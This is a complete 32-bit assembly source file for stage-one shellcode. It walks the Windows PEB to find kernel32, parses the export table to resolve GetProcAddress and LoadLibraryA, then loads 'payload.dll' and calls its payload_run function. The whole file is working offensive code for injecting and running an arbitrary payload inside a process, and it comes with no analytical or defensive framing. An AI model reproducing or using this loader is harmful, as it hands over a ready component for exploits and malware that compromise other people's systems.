; stage1_dll.asm
; shellcode that loads payload.dll and calls payload_run()

BITS 32
    call main ; push &str_base onto stack, jump to main

; string table
str_base:
s_loadlib: db "LoadLibraryA", 0
s_getproc: db "GetProcAddress", 0
s_payload_dll: db "payload.dll", 0
s_payload_fn: db "payload_run", 0

; offset
%define OFF_LOADLIB (s_loadlib - str_base)
%define OFF_GETPROC (s_getproc - str_base)
%define OFF_PAYLOAD_DLL (s_payload_dll - str_base)
%define OFF_PAYLOAD_FN (s_payload_fn - str_base)

main:
    pop ebp ; EBP = &str_base (call pushed this)

    ; PEB walk -> kernel32 base -> EBX
    mov eax, [fs:0x30] ; PEB
    mov eax, [eax+0x0C] ; Ldr
    mov eax, [eax+0x14] ; InMemoryOrderModuleList
    mov eax, [eax] ; skip exe
    mov eax, [eax] ; skip ntdll
    mov ebx, [eax+0x10] ; EBX = kernel32 DllBase

    ; export parse -> GetProcAddress -> ESI
    mov edx, [ebx+0x3C]
    add edx, ebx
    mov edx, [edx+0x78]
    add edx, ebx

    mov ecx, [edx+0x18]
    mov edi, [edx+0x20]
    add edi, ebx

.find_gpa:
    dec ecx
    mov eax, [edi+ecx*4]
    add eax, ebx

    cmp dword [eax], 0x50746547 ; "GetP"
    jne .find_gpa

    cmp dword [eax+4], 0x41636F72 ; "rocA"
    jne .find_gpa

    cmp dword [eax+8], 0x65726464 ; "ddre"
    jne .find_gpa

    mov edi, [edx+0x24]
    add edi, ebx
    movzx ecx, word [edi+ecx*2]
    mov edi, [edx+0x1C]
    add edi, ebx
    mov eax, [edi+ecx*4]
    add eax, ebx
    mov esi, eax ; ESI = GetProcAddress

    ; GetProcAddress(kernel32, "LoadLibraryA") -> ECX
    lea eax, [ebp+OFF_LOADLIB]
    push eax
    push ebx ; kernel32
    call esi
    mov ecx, eax ; ECX = LoadLibraryA

    ; LoadLibrary("payload.dll") -> EBX
    lea eax, [ebp+OFF_PAYLOAD_DLL]
    push eax
    call ecx ; LoadLibraryA("payload.dll")
    mov ebx, eax ; EBX = payload.dll HMODULE

    ; GetProcAddress(payload.dll, "payload_run") -> EAX
    lea eax, [ebp+OFF_PAYLOAD_FN]
    push eax
    push ebx
    call esi ; GetProcAddress(payload.dll, "payload_run")

    ; call payload_run()
    call eax

    ret